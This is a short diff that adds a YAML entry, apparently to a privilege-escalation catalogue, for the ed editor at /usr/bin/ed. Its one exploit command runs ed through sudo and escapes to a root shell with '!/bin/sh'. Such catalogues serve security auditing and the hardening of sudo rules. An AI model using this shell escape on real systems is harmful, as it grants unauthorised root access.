@@ -1,0 +1,4 @@
+name: ed
+binary_path: /usr/bin/ed
+exploit_cmds:
+- sudo /usr/bin/ed && !/bin/sh && q
